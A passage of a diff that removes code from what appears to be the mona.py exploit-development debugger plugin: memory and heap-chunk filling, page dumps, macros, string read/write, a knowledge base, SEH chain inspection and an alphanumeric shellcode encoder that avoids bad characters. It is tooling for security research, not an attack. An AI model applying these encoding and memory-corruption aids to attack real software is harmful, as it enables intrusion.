-                    if reference.find("[") > -1 and reference.find("]") > -1:
-                        refregtmp = reference.replace("[","").replace("]","").replace(" ","")
-                        if reference.find("+") > -1 or reference.find("-") > -1:
-                            # deref with offset
-                            refregtmpparts = []
-                            if reference.find("+") > -1:
-                                refregtmpparts = refregtmp.split("+")
-                                signstuff = 1
-                            if reference.find("-") > -1:
-                                refregtmpparts = refregtmp.split("-")
-                                signstuff = -1
-                            if len(refregtmpparts) > 1:
-                                offset = int(refregtmpparts[1].replace("0X",""),16) * signstuff
-                                deref = True
-                                refreg = refregtmpparts[0]
-                                if not refreg in allregs:
-                                    dbg.log("** Please provide a valid reference using -r reg/reference **")
-                                    return
-                            else:
-                                dbg.log("** Please provide a valid reference using -r reg/reference **")
-                                return                                                              
-                        else:
-                            # only deref
-                            refreg = refregtmp
-                            deref = True
-                    else:
-                        # no deref, maybe offset
-                        if reference.find("+") > -1 or reference.find("-") > -1:
-                            # deref with offset
-                            refregtmpparts = []
-                            refregtmp = reference.replace(" ","")
-                            if reference.find("+") > -1:
-                                refregtmpparts = refregtmp.split("+")
-                                signstuff = 1
-                            if reference.find("-") > -1:
-                                refregtmpparts = refregtmp.split("-")
-                                signstuff = -1
-                            if len(refregtmpparts) > 1:
-                                offset = int(refregtmpparts[1].replace("0X",""),16) * signstuff
-                                refreg = refregtmpparts[0]
-                                if not refreg in allregs:
-                                    dbg.log("** Please provide a valid reference using -r reg/reference **")
-                                    return
-                            else:
-                                dbg.log("** Please provide a valid reference using -r reg/reference **")
-                                return                                                              
-                        else:
-                            # only deref
-                            refregtmp = reference.replace(" ","")
-                            refreg = refregtmp
-                            deref = False
-                else:
-                    dbg.log("** Please provide a valid reference using -r reg/reference **")
-                    return
-            else:
-                dbg.log("** Please provide a valid reference using -r reg/reference **")
-                return
-
-            if not refreg in allregs:
-                dbg.log("** Please provide a valid reference using -r reg/reference **")
-                return              
-
-            dbg.log("Ref : %s" % refreg)
-            dbg.log("Offset : %d (0x%s)" % (offset,toHex(int(str(offset).replace("-","")))))
-            dbg.log("Deref ? : %s" % deref)
-
-            if "b" in args:
-                if type(args["b"]).__name__.lower() != "bool":
-                    if args["b"].find("\\x") > -1:
-                        fillchar = hex2bin(args["b"])[0]
-                    else:
-                        fillchar = args["b"][0]
-
-            # see if we can read the reference
-            refvalue = 0
-            if deref:
-                refref = 0
-                try:
-                    refref = allregs[refreg]+offset
-                except:
-                    dbg.log("** Unable to read from %s (0x%08x)" % (origreference,allregs[refreg]+offset))
-                try:
-                    refvalue = struct.unpack('<L',dbg.readMemory(refref,4))[0]
-                except:
-                    dbg.log("** Unable to read from %s (0x%08x) -> 0x%08x" % (origreference,allregs[reference]+offset,refref))
-                    return
-            else:
-                try:
-                    refvalue = allregs[refreg]+offset
-                except:
-                    dbg.log("** Unable to read from %s (0x%08x)" % (reference,allregs[refreg]+offset))
-
-            dbg.log("Reference : %s: 0x%08x" % (origreference,refvalue))
-            dbg.log("Fill char : \\x%s" % bin2hex(fillchar))
-
-            cmd2run = "!heap -p -a 0x%08x" % refvalue
-            output = dbg.nativeCommand(cmd2run)
-            outputlines = output.split("\n")
-            heapinfo = ""
-            for line in outputlines:
-                if line.find("[") > -1 and line.find("]") > -1 and line.find("(") > -1 and line.find(")") > -1:
-                    heapinfo = line
-                    break
-            if heapinfo == "":
-                dbg.log("Address is not part of a heap chunk")
-                if customsize > 0:
-                    dbg.log("Filling memory location starting at 0x%08x with \\x%s" % (refvalue,bin2hex(fillchar)))
-                    dbg.log("Number of bytes to write : %d (0x%08x)" % (customsize,customsize))
-                    data = fillchar * customsize
-                    dbg.writeMemory(refvalue,data)
-                    dbg.log("Done")
-                else:
-                    dbg.log("Please specify a custom size with -s to fill up the memory location anyway")
-            else:
-                infofields = []
-                cnt = 0
-                charseen = False
-                thisfield = ""
-                while cnt < len(heapinfo):
-                    if heapinfo[cnt] == " " and charseen and thisfield != "":
-                        infofields.append(thisfield)
-                        thisfield = ""
-                    else:
-                        if not heapinfo[cnt] == " ":
-                            thisfield += heapinfo[cnt]
-                            charseen = True
-                    cnt += 1
-                if thisfield != "":
-                    infofields.append(thisfield)
-                if len(infofields) > 7:
-                    chunkptr = hexStrToInt(infofields[0]) 
-                    userptr = hexStrToInt(infofields[4])
-                    size = hexStrToInt(infofields[5])
-                    dbg.log("Heap chunk found at 0x%08x, size 0x%08x (%d) bytes" % (chunkptr,size,size))
-                    dbg.log("Filling chunk with \\x%s, starting at 0x%08x" % (bin2hex(fillchar),userptr))
-                    data = fillchar * size
-                    dbg.writeMemory(userptr,data)
-                    dbg.log("Done")
-            return
-
-        def procInfoDump(args):
-            allpages = dbg.getMemoryPages()
-            filename = "infodump.xml"
-            xmldata = '<info>\n'
-            xmldata += "<modules>\n"
-            populateModuleInfo()
-            modulestoquery=[]
-            for thismodule,modproperties in g_modules.iteritems():
-                xmldata += "  <module name='%s'>\n" % thismodule
-                thisbase = getModuleProperty(thismodule,"base")
-                thissize = getModuleProperty(thismodule,"size")
-                xmldata += "    <base>0x%08x</base>\n" % thisbase
-                xmldata += "    <size>0x%08x</size>\n" % thissize
-                xmldata += "  </module>\n"
-            xmldata += "</modules>\n"
-            orderedpages = []
-            for tpage in allpages.keys():
-                orderedpages.append(tpage)
-            orderedpages.sort()
-            if len(orderedpages) > 0:
-                xmldata += "<pages>\n"              
-                # first dump module info to file
-                objfile = MnLog(filename)
-                infofile = objfile.reset(clear=True,showheader=False)
-                f = open(infofile,"wb")
-                for line in xmldata.split("\n"):
-                    if line != "":
-                        f.write(line + "\n")
-                tolog = "Dumping the following pages to file:"
-                dbg.log(tolog)
-                tolog = "Start        End        Size         ACL"
-                dbg.log(tolog)
-                for thispage in orderedpages:
-                    page = allpages[thispage]
-                    pagestart = page.getBaseAddress()
-                    pagesize = page.getSize()
-                    ptr = MnPointer(pagestart)
-                    mod = ""
-                    sectionname = ""
-                    ismod = False
-                    isstack = False
-                    isheap = False
-                    try:
-                        mod = ptr.belongsTo()
-                        if mod != "":
-                            ismod = True
-                    except:
-                        mod = ""
-                    if not ismod:
-                        if ptr.isOnStack():
-                            isstack = True
-                    if not ismod and not isstack:
-                        if ptr.isInHeap():
-                            isheap = True
-                    if not ismod and not isstack and not isheap:
-                        acl = page.getAccess(human=True)
-                        if not "NOACCESS" in acl:
-                            tolog = "0x%08x - 0x%08x (0x%08x) %s" % (pagestart,pagestart + pagesize,pagesize,acl)
-                            dbg.log(tolog)
-                            # add page contents to xml
-                            thispage = dbg.readMemory(pagestart,pagesize)
-                            f.write("  <page start=\"0x%08x\">\n" % pagestart)
-                            f.write("    <size>0x%08x</size>\n" % pagesize)
-                            f.write("    <acl>%s</acl>\n" % acl)
-                            f.write("    <contents>")
-                            memcontents = ""
-                            for thisbyte in thispage:
-                                memcontents += bin2hex(thisbyte)
-                            f.write(memcontents)
-                            f.write("</contents>\n")
-                            f.write("  </page>\n")
-                f.write("</pages>\n")
-                f.write("</info>")
-                dbg.log("")
-                f.close()
-                dbg.log("Done")
-            return
-
-        
-        def procPEB(args):
-            """
-            Show the address of the PEB
-            """
-            pebaddy = dbg.getPEBAddress()
-            dbg.log("PEB is located at 0x%08x" % pebaddy,address=pebaddy)
-            return
-
-        def procTEB(args):
-            """
-            Show the address of the TEB for the current thread
-            """
-            tebaddy = dbg.getCurrentTEBAddress()
-            dbg.log("TEB is located at 0x%08x" % tebaddy,address=tebaddy)
-            return
-
-        def procPageACL(args):
-            global silent
-            silent = True
-            findaddy = 0
-            if "a" in args:
-                findaddy,addyok = getAddyArg(args["a"])
-                if not addyok:
-                    dbg.log("%s is an invalid address" % args["a"], highlight=1)
-                    return
-            if findaddy > 0:
-                dbg.log("Displaying page information around address 0x%08x" % findaddy)
-            allpages = dbg.getMemoryPages()
-            dbg.log("Total of %d pages : "% len(allpages))
-            filename="pageacl.txt"
-            orderedpages = []
-            for tpage in allpages.keys():
-                orderedpages.append(tpage)
-            orderedpages.sort()
-            # find indexes to show in case we have specified an address
-            toshow = []
-            previouspage = 0
-            nextpage = 0
-            pagefound = False
-            if findaddy > 0:
-                for thispage in orderedpages:
-                    page = allpages[thispage]
-                    pagestart = page.getBaseAddress()
-                    pagesize = page.getSize()
-                    pageend = pagestart + pagesize
-                    if findaddy >= pagestart and findaddy < pageend:
-                        toshow.append(thispage)
-                        pagefound = True
-                    if pagefound and previouspage > 0:
-                        if not previouspage in toshow:
-                            toshow.append(previouspage)
-                        if not thispage in toshow:
-                            toshow.append(thispage) # nextpage
-                        break
-                    previouspage = thispage
-            if len(toshow) > 0:
-                toshow.sort()
-                orderedpages = toshow
-                dbg.log("Showing %d pages" % len(orderedpages))
-            if len(orderedpages) > 0:
-                objfile = MnLog(filename)
-                aclfile = objfile.reset()
-                tolog = "Start        End        Size         ACL"
-                dbg.log(tolog)
-                objfile.write(tolog,aclfile)
-                for thispage in orderedpages:
-                    page = allpages[thispage]
-                    pagestart = page.getBaseAddress()
-                    pagesize = page.getSize()
-                    ptr = MnPointer(pagestart)
-                    mod = ""
-                    sectionname = ""
-                    try:
-                        mod = ptr.belongsTo()
-                        if not mod == "":
-                            mod = "(" + mod + ")"
-                            sectionname = page.getSection()
-                    except:
-                        #print traceback.format_exc()
-                        pass
-                    if mod == "":
-                        if ptr.isOnStack():
-                            mod = "(Stack)"
-                        elif ptr.isInHeap():
-                            mod = "(Heap)"
-                    acl = page.getAccess(human=True)
-                    tolog = "0x%08x - 0x%08x (0x%08x) %s %s %s" % (pagestart,pagestart + pagesize,pagesize,acl,mod, sectionname)
-                    objfile.write(tolog,aclfile)
-                    dbg.log(tolog)
-            silent = False
-            return
-
-        def procMacro(args):
-            validcommands = ["run","set","list","del","add","show"]
-            validcommandfound = False
-            selectedcommand = ""
-            for command in validcommands:
-                if command in args:
-                    validcommandfound = True
-                    selectedcommand = command
-                    break
-            dbg.log("")
-            if not validcommandfound:
-                dbg.log("*** Please specify a valid command. Valid commands are :")
-                for command in validcommands:
-                    dbg.log("    -%s" % command)
-                return          
-
-            macroname = ""
-            if "set" in args:
-                if type(args["set"]).__name__.lower() != "bool":
-                    macroname = args["set"]
-
-            if "show" in args:
-                if type(args["show"]).__name__.lower() != "bool":
-                    macroname = args["show"]
-
-            if "add" in args:
-                if type(args["add"]).__name__.lower() != "bool":
-                    macroname = args["add"]             
-
-            if "del" in args:
-                if type(args["del"]).__name__.lower() != "bool":
-                    macroname = args["del"] 
-
-            if "run" in args:
-                if type(args["run"]).__name__.lower() != "bool":
-                    macroname = args["run"] 
-
-            filename = ""
-            index = -1
-            insert = False
-            iamsure = False
-            if "index" in args:
-                if type(args["index"]).__name__.lower() != "bool":
-                    index = int(args["index"])
-                    if index < 0:
-                        dbg.log("** Please use a positive integer as index",highlight=1)
-
-            if "file" in args:
-                if type(args["file"]).__name__.lower() != "bool":
-                    filename = args["file"]
-
-            if filename != "" and index > -1:
-                dbg.log("** Please either provide an index or a filename, not both",highlight=1)
-                return
-
-            if "insert" in args:
-                insert = True
-
-            if "iamsure" in args:
-                iamsure = True
-
-            argcommand = ""
-            if "cmd" in args:
-                if type(args["cmd"]).__name__.lower() != "bool":
-                    argcommand = args["cmd"]
-
-
-            dbg.setKBDB("monamacro.db")
-            macros = dbg.getKnowledge("macro")
-            if macros is None:
-                macros = {}
-
-            if selectedcommand == "list":
-                for macro in macros:
-                    thismacro = macros[macro]
-                    macronametxt = "Macro : '%s' : %d command(s)" % (macro,len(thismacro))
-                    dbg.log(macronametxt)
-                dbg.log("")
-                dbg.log("Number of macros : %d" % len(macros))
-
-            if selectedcommand == "show":
-                if macroname != "":
-                    if not macroname in macros:
-                        dbg.log("** Macro %s does not exist !" % macroname)
-                        return
-                    else:
-                        macro = macros[macroname]
-                        macronametxt = "Macro : %s" % macroname
-                        macroline = "-" * len(macronametxt)
-                        dbg.log(macronametxt)
-                        dbg.log(macroline)
-                        thismacro = macro
-                        macrolist = []
-                        for macroid in thismacro:
-                            macrolist.append(macroid)
-                        macrolist.sort()
-                        nr_of_commands = 0
-                        for macroid in macrolist:
-                            macrocmd = thismacro[macroid]
-                            if macrocmd.startswith("#"):
-                                dbg.log("   [%04d] File:%s" % (macroid,macrocmd[1:]))
-                            else:
-                                dbg.log("   [%04d] %s" % (macroid,macrocmd))
-                            nr_of_commands += 1
-                        dbg.log("")
-                        dbg.log("Nr of commands in this macro : %d" % nr_of_commands)
-                else:
-                    dbg.log("** Please specify the macroname to show !",highlight=1)
-                    return                  
-
-            if selectedcommand == "run":
-                if macroname != "":
-                    if not macroname in macros:
-                        dbg.log("** Macro %s does not exist !" % macroname)
-                        return
-                    else:
-                        macro = macros[macroname]
-                        macronametxt = "Running macro : %s" % macroname
-                        macroline = "-" * len(macronametxt)
-                        dbg.log(macronametxt)
-                        dbg.log(macroline)
-                        thismacro = macro
-                        macrolist = []
-                        for macroid in thismacro:
-                            macrolist.append(macroid)
-                        macrolist.sort()
-                        for macroid in macrolist:
-                            macrocmd = thismacro[macroid]
-                            if macrocmd.startswith("#"):
-                                dbg.log("Executing script %s" % macrocmd[1:])
-                                output = dbg.nativeCommand("$<%s" % macrocmd[1:])
-                                dbg.logLines(output)
-                                dbg.log("-" * 40)
-                            else:
-                                dbg.log("Index %d : %s" % (macroid,macrocmd))
-                                dbg.log("")
-                                output = dbg.nativeCommand(macrocmd)
-                                dbg.logLines(output)
-                                dbg.log("-" * 40)
-                        dbg.log("")
-                        dbg.log("[+] Done.")
-                else:
-                    dbg.log("** Please specify the macroname to run !",highlight=1)
-                    return  
-
-            if selectedcommand == "set":
-                if macroname != "":
-                    if not macroname in macros:
-                        dbg.log("** Macro %s does not exist !" % macroname)
-                        return
-                    if argcommand == "" and filename == "":
-                        dbg.log("** Please enter a valid command with parameter -cmd",highlight=1)
-                        return
-                    thismacro = macros[macroname]
-                    if index == -1:
-                        for i in thismacro:
-                            thiscmd = thismacro[i]
-                            if thiscmd.startswith("#"):
-                                dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
-                                dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
-                                return                      
-                        if filename == "":
-                            # append to end of the list
-                            # find the next index first
-                            nextindex = 0
-                            for macindex in thismacro:
-                                if macindex >= nextindex:
-                                    nextindex = macindex+1
-                            if thismacro.__class__.__name__ == "dict":
-                                thismacro[nextindex] = argcommand
-                            else:
-                                thismacro = {}
-                                thismacro[nextindex] = argcommand
-                        else:
-                            thismacro = {}
-                            nextindex = 0
-                            thismacro[0] = "#%s" % filename
-                        macros[macroname] = thismacro
-                        dbg.addKnowledge("macro",macros)
-                        dbg.log("[+] Done, saved new command at index %d." % nextindex)
-                    else:
-                        # user has specified an index
-                        if index in thismacro:
-                            if argcommand == "#":
-                                # remove command at this index
-                                del thismacro[index]
-                            else:
-                                # if macro already contains a file entry, bail out
-                                for i in thismacro:
-                                    thiscmd = thismacro[i]
-                                    if thiscmd.startswith("#"):
-                                        dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
-                                        dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
-                                        return
-                                # index exists - overwrite unless -insert was provided too
-                                # remove or insert ?
-                                #print sys.argv
-                                if not insert:
-                                    thismacro[index] = argcommand
-                                else:
-                                    # move things around
-                                    # get ordered list of existing indexes
-                                    indexes = []
-                                    for macindex in thismacro:
-                                        indexes.append(macindex)
-                                    indexes.sort()
-                                    thismacro2 = {}
-                                    cmdadded = False
-                                    for i in indexes:
-                                        if i < index:
-                                            thismacro2[i] = thismacro[i]
-                                        elif i == index:
-                                            thismacro2[i] = argcommand
-                                            thismacro2[i+1] = thismacro[i]
-                                        elif i > index:
-                                            thismacro2[i+1] = thismacro[i]
-                                    thismacro = thismacro2
-                        else:
-                            # index does not exist, add new command to this index
-                            for i in thismacro:
-                                thiscmd = thismacro[i]
-                                if thiscmd.startswith("#"):
-                                    dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
-                                    dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
-                                    return                          
-                            if argcommand != "#":
-                                thismacro[index] = argcommand
-                            else:
-                                dbg.log("** Index %d does not exist, unable to remove the command at that position" % index,highlight=1)
-                        macros[macroname] = thismacro
-                        dbg.addKnowledge("macro",macros)
-                        if argcommand != "#":
-                            dbg.log("[+] Done, saved new command at index %d." % index)
-                        else:
-                            dbg.log("[+] Done, removed command at index %d." % index)
-                else:
-                    dbg.log("** Please specify the macroname to edit !",highlight=1)
-                    return
-
-            if selectedcommand == "add":
-                if macroname != "":
-                    if macroname in macros:
-                        dbg.log("** Macro '%s' already exists !" % macroname,highlight=1)
-                        return
-                    else:
-                        macros[macroname] = {}
-                        dbg.log("[+] Adding macro '%s'" % macroname)
-                        dbg.addKnowledge("macro",macros)
-                        dbg.log("[+] Done.")
-                else:
-                    dbg.log("** Please specify the macroname to add !",highlight=1)
-                    return
-
-
-            if selectedcommand == "del":
-                if not macroname in macros:
-                    dbg.log("** Macro '%s' doesn't exist !" % macroname,highlight=1)
-                else:
-                    if not iamsure:
-                        dbg.log("** To delete macro '%s', please add the -iamsure flag to the command" % macroname)
-                        return
-                    else:
-                        dbg.forgetKnowledge("macro",macroname)
-                        dbg.log("[+] Done, deleted macro '%s'" % macroname)
-            return
-
-
-        def procEnc(args):
-            validencoders = ['alphanum']
-            encodertyperror = True
-            byteerror = True
-            encodertype = ""
-            bytestoencodestr = ""
-            bytestoencode = ""
-            badbytes = ""
-            
-            if "t" in args:
-                if type(args["t"]).__name__.lower() != "bool":
-                    encodertype = args["t"]
-                    encodertyperror = False
-
-            if "s" in args:
-                if type(args["s"]).__name__.lower() != "bool":
-                    bytestoencodestr = args["s"]
-                    byteerror = False
-
-            if "f" in args:
-                if type(args["f"]).__name__.lower() != "bool":
-                    binfile = args["f"]
-                    if os.path.exists(binfile):
-                        if not silent:
-                            dbg.log("[+] Reading bytes from %s" % binfile)
-                        try:
-                            f = open(binfile,"rb")
-                            content = f.readlines()
-                            f.close()
-                            for c in content:
-                                for a in c:
-                                    bytestoencodestr += "\\x%02x" % ord(a)
-                            byteerror = False
-                        except:
-                            dbg.log("*** Error - unable to read bytes from %s" % binfile)
-                            dbg.logLines(traceback.format_exc(),highlight=True)
-                            byteerror = True
-                    else:
-                        byteerror = True
-                else:
-                    byteerror = True
-
-            if "cpb" in args:
-                if type(args["cpb"]).__name__.lower() != "bool":
-                    badbytes = hex2bin(args["cpb"])
-
-            if not encodertype in validencoders:
-                encodertyperror = True
-
-            if bytestoencodestr == "":
-                byteerror = True
-            else:
-                bytestoencode = hex2bin(bytestoencodestr)
-
-            if encodertyperror:
-                dbg.log("*** Please specific a valid encodertype with parameter -t.",highlight=True)
-                dbg.log("*** Valid types are: %s" % validencoders,highlight=True)
-
-
-            if byteerror:
-                dbg.log("*** Please specify a valid series of bytes with parameter -s",highlight=True)
-                dbg.log("*** or specify a valid path with parameter -f",highlight=True)
-
-            if encodertyperror or byteerror:
-                return
-            else:
-                cEncoder = MnEncoder(bytestoencode)
-                encodedbytes = ""
-                if encodertype == "alphanum":
-                    encodedbytes = cEncoder.encodeAlphaNum(badchars = badbytes)
-                    # determine correct sequence of dictionary
-                    if len(encodedbytes) > 0:
-                        logfile = MnLog("encoded_%s.txt" % encodertype)
-                        thislog = logfile.reset()
-                        if not silent:
-                            dbg.log("")
-                            dbg.log("Results:")
-                            dbg.log("--------")
-                        logfile.write("",thislog)
-                        logfile.write("Results:",thislog)
-                        logfile.write("--------",thislog)
-                        encodedindex = []
-                        fulllist_str = ""
-                        fulllist_bin = ""
-                        for i in encodedbytes:
-                            encodedindex.append(i)
-                        for i in encodedindex:
-                            thisline = encodedbytes[i]
-                            # 0 = bytes
-                            # 1 = info
-                            thislinebytes = "\\x" +  "\\x".join(bin2hex(a) for a in thisline[0])
-                            logline = "  %s : %s : %s" % (thisline[0],thislinebytes,thisline[1])
-                            if not silent:
-                                dbg.log("%s" % logline)
-                            logfile.write(logline,thislog)
-                            fulllist_str += thislinebytes
-                            fulllist_bin += thisline[0]
-
-                        if not silent:
-                            dbg.log("")
-                            dbg.log("Full encoded string:")
-                            dbg.log("--------------------")
-                            dbg.log("%s" % fulllist_bin)
-                        logfile.write("",thislog)
-                        logfile.write("Full encoded string:",thislog)
-                        logfile.write("--------------------",thislog)
-                        logfile.write("%s" % fulllist_bin,thislog)
-                        logfile.write("",thislog)
-                        logfile.write("Full encoded hex:",thislog)
-                        logfile.write("-----------------",thislog)
-                        logfile.write("%s" % fulllist_str,thislog)
-            return
-
-        def procString(args):
-            mode = ""
-            useunicode = False
-            terminatestring = True
-            addy = 0
-            regs = dbg.getRegs()
-            stringtowrite = ""
-            # read or write ?
-            if not "r" in args and not "w" in args:
-                dbg.log("*** Error: you must indicate if you want to read (-r) or write (-w) ***",highlight=True)
-                return
-            addresserror = False
-            if not "a" in args:
-                addresserror = True
-            else:
-                if type(args["a"]).__name__.lower() != "bool":
-                    # check if it's a register or not
-                    if str(args["a"]).upper() in regs:
-                        addy = regs[str(args["a"].upper())]
-                    else:
-                        addy = int(args["a"],16)
-                else:
-                    addresserror = True
-
-            if addresserror:
-                dbg.log("*** Error: you must specify a valid address with -a ***",highlight=True)
-                return
-
-            if "w" in args:
-                mode = "write"
-            if "r" in args:
-                # read wins, because it's non destructive
-                mode = "read"
-            if "u" in args:
-                useunicode = True
-
-            stringerror = False
-            if "w" in args and not "s" in args:
-                stringerror = True
-            if "s" in args:
-                if type(args["s"]).__name__.lower() != "bool":
-                    stringtowrite = args["s"]
-                else:
-                    stringerror = True
-
-            if "noterminate" in args:
-                terminatestring = False
-
-            if stringerror:
-                dbg.log("*** Error: you must specify a valid string with -s ***",highlight=True)
-                return
-
-            if mode == "read":
-                stringinmemory = ""
-                extra = " "
-                try:
-                    if not useunicode:
-                        stringinmemory = dbg.readString(addy)
-                    else:
-                        stringinmemory = dbg.readWString(addy)
-                        extra = " (unicode) "
-                    dbg.log("String%sat 0x%08x:" % (extra,addy))
-                    dbg.log("%s" % stringinmemory)
-                except:
-                    dbg.log("Unable to read string at 0x%08x" % addy)
-            if mode == "write":
-                origstring = stringtowrite
-                writtendata = ""
-                try:
-                    if not useunicode:
-                        if terminatestring:
-                            stringtowrite += "\x00"
-                        byteswritten = ""
-                        for c in stringtowrite:
-                            byteswritten += " %s" % bin2hex(c)
-                        dbg.writeMemory(addy,stringtowrite)
-                        writtendata = dbg.readString(addy)
-                        dbg.log("Wrote string (%d bytes) to 0x%08x:" % (len(stringtowrite),addy))
-                        dbg.log("%s" % byteswritten)
-                    else:
-                        newstring = ""
-                        for c in stringtowrite:
-                            newstring += "%s%s" % (c,"\x00")
-                        if terminatestring:
-                            newstring += "\x00\x00"
-                        dbg.writeMemory(addy,newstring)
-                        dbg.log("Wrote unicode string (%d bytes) to 0x%08x" % (len(newstring),addy))
-                        writtendata = dbg.readWString(addy)
-                        byteswritten = ""
-                        for c in newstring:
-                            byteswritten += " %s" % bin2hex(c)
-                        dbg.log("%s" % byteswritten)
-                    if not writtendata.startswith(origstring):
-                        dbg.log("Write operation succeeded, but the string in memory doesn't appear to be there",highlight=True)
-                except:
-                    dbg.log("Unable to write the string to 0x%08x" % addy)  
-                    dbg.logLines(traceback.format_exc(),highlight=True)         
-            return
-
-
-        def procKb(args):
-            validcommands = ['set','list','del']
-            validcommandfound = False
-            selectedcommand = ""
-            selectedid = ""
-            selectedvalue = ""
-            for command in validcommands:
-                if command in args:
-                    validcommandfound = True
-                    selectedcommand = command
-                    break
-            dbg.log("")
-            if not validcommandfound:
-                dbg.log("*** Please specify a valid command. Valid commands are :")
-                for command in validcommands:
-                    dbg.log("    -%s" % command)
-                return
-
-            if "id" in args:
-                if type(args["id"]).__name__.lower() != "bool":
-                    selectedid = args["id"]
-
-            if "value" in args:
-                if type(args["value"]).__name__.lower() != "bool":
-                    selectedvalue = args["value"]
-
-            dbg.log("Knowledgebase database : %s" % dbg.getKBDB())
-            kb = dbg.listKnowledge()
-            if selectedcommand == "list":
-                dbg.log("Number of IDs in Knowledgebase : %d" % len(kb))
-                if len(kb) > 0:
-                    if selectedid == "":
-                        dbg.log("IDs :")
-                        dbg.log("-----")
-                        for kbid in kb:
-                            dbg.log(kbid)
-                    else:
-                        if selectedid in kb:
-                            kbid = dbg.getKnowledge(selectedid)
-                            kbtype = kbid.__class__.__name__
-                            kbtitle = "Entries for ID %s (type %s) :" % (selectedid,kbtype)
-                            dbg.log(kbtitle)
-                            dbg.log("-" * (len(kbtitle)+2))
-                            if selectedvalue != "":
-                                dbg.log("  (Filter : %s)" % selectedvalue)
-                            nrentries = 0
-                            if kbtype == "dict":
-                                for dictkey in kbid:
-                                    if selectedvalue == "" or selectedvalue in dictkey:
-                                        logline = ""
-                                        if kbid[dictkey].__class__.__name__ == "int" or kb[dictkey].__class__.__name__ == "long":
-                                            logline = "  %s : %d (0x%x)" % (str(dictkey),kbid[dictkey],kbid[dictkey])
-                                        else:
-                                            logline = "  %s : %s" % (str(dictkey),kbid[dictkey])
-                                        dbg.log(logline)
-                                        nrentries += 1
-                            if kbtype == "list":
-                                cnt = 0
-                                for entry in kbid:
-                                    dbg.log("  %d : %s" % (cnt,kbid[entry]))
-                                    cnt += 1
-                                    nrentries += 1
-                            if kbtype == "str":
-                                dbg.log("  %s" % kbid)
-                                nrentries += 1
-                            if kbtype == "int" or kbtype == "long":
-                                dbg.log("  %d (0x%08x)" % (kbid,kbid))
-                                nrentries += 1
-
-                            dbg.log("")
-                            filtertxt = ""
-                            if selectedvalue != "":
-                                filtertxt="filtered "
-                            dbg.log("Number of %sentries for ID %s : %d" % (filtertxt,selectedid,nrentries))
-                        else:
-                            dbg.log("ID %s was not found in the Knowledgebase" % selectedid)
-
-            if selectedcommand == "set":
-                # we need an ID and a value argument
-                if selectedid == "":
-                    dbg.log("*** Please enter a valid ID with -id",highlight=1)
-                    return
-                if selectedvalue == "":
-                    dbg.log("*** Please enter a valid value",highlight=1)
-                    return
-                if selectedid in kb:
-                    # vtableCache
-                    if selectedid == "vtableCache":
-                        # split on command
-                        valueparts = selectedvalue.split(",")
-                        if len(valueparts) == 2:
-                            vtablename = valueparts[0].strip(" ")
-                            vtablevalue = 0
-                            if "0x" in valueparts[1].lower():
-                                vtablevalue = int(valueparts[1],16)
-                            else:
-                                vtablevalue = int(valueparts[1])
-                            kbadd = {}
-                            kbadd[vtablename] = vtablevalue
-                            dbg.addKnowledge(selectedid,kbadd)
-                        else:
-                            dbg.log("*** Please provide a valid value for -value")
-                            dbg.log("*** KB %s contains a list, please use a comma")
-                            dbg.log("*** to separate entries. First entry should be a string,")
-                            dbg.log("*** Second entry should be an integer.")
-                            return
-                    else:
-                        dbg.addKnowledge(selectedid,selectedvalue)
-                    dbg.log(" ")
-                    dbg.log("ID %s updated." % selectedid)
-                else:
-                    dbg.log("ID %s was not found in the Knowledgebase" % selectedid)
-
-            if selectedcommand == "del":
-                if selectedid == "" or selectedid not in kb:
-                    dbg.log("*** Please enter a valid ID with -id",highlight=1)
-                    return
-                else:
-                    dbg.forgetKnowledge(selectedid,selectedvalue)
-                if selectedvalue == "":
-                    dbg.log("*** Entire ID %s removed from Knowledgebase" % selectedid)
-                else:
-                    dbg.log("*** Object %s in ID %s removed from Knowledgebase" % (selectedvalue,selectedid))
-            return
-
-        def procBPSeh(self):
-            sehchain = dbg.getSehChain()
-            dbg.log("Nr of SEH records : %d" % len(sehchain))
-            if len(sehchain) > 0:
-                dbg.log("SEH Chain :")
-                dbg.log("-----------")
-                dbg.log("Address     Next SEH    Handler")
-                for sehrecord in sehchain:
-                    address = sehrecord[0]
-                    sehandler = sehrecord[1]
-                    nseh = ""
-                    try:
-                        nsehvalue = struct.unpack('<L',dbg.readMemory(address,4))[0]
-                        nseh = "0x%08x" % nsehvalue
-                    except:
-                        nseh = "0x????????"
-                    bpsuccess = True
-                    try:
-                        if __DEBUGGERAPP__ == "WinDBG":
-                            bpsuccess = dbg.setBreakpoint(sehandler)
-                        else:
-                            dbg.setBreakpoint(sehandler)
-                            bpsuccess = True
-                    except:
-                        bpsuccess = False
-                    bptext = ""
-                    if not bpsuccess:
-                        bptext = "BP failed"
-                    else:
-                        bptext = "BP set"
-                    ptr = MnPointer(sehandler)
-                    funcinfo = ptr.getPtrFunction()
-                    dbg.log("0x%08x  %s  0x%08x %s <- %s" % (address,nseh,sehandler,funcinfo,bptext))
-            dbg.log("")
-            return "Done"
-
-        def procSehChain(self):
-            sehchain = dbg.getSehChain()
-            dbg.log("Nr of SEH records : %d" % len(sehchain))
-            handlersoverwritten = {}
-            if len(sehchain) > 0:
-                dbg.log("Start of chain (TEB FS:[0]) : 0x%08x" % sehchain[0][0])
-                dbg.log("Address     Next SEH    Handler")
-                dbg.log("-------     --------    -------")
-                for sehrecord in sehchain:
-                    recaddress = sehrecord[0]
-                    sehandler = sehrecord[1]
-                    nseh = ""
-                    try:
-                        nsehvalue = struct.unpack('<L',dbg.readMemory(recaddress,4))[0]
-                        nseh = "0x%08x" % nsehvalue
-                    except:
-                        nseh = 0
-                        sehandler = 0
-                    overwritedata = checkSEHOverwrite(recaddress,nseh,sehandler)
-                    overwritemark = ""
-                    funcinfo = ""
-                    if sehandler > 0:
-                        ptr = MnPointer(sehandler)
-                        funcinfo = ptr.getPtrFunction()
-                    else:
-                        funcinfo = " (corrupted record)"
-                        if str(nseh).startswith("0x"):
-                            nseh = "0x%08x" % int(nseh,16)
-                        else:
-                            nseh = "0x%08x" % int(nseh)
-                    if len(overwritedata) > 0:
-                        handlersoverwritten[recaddress] = overwritedata
-                        smashoffset = int(overwritedata[1])
-                        typeinfo = ""
-                        if overwritedata[0] == "unicode":
-                            smashoffset += 2
-                            typeinfo = " [unicode]"
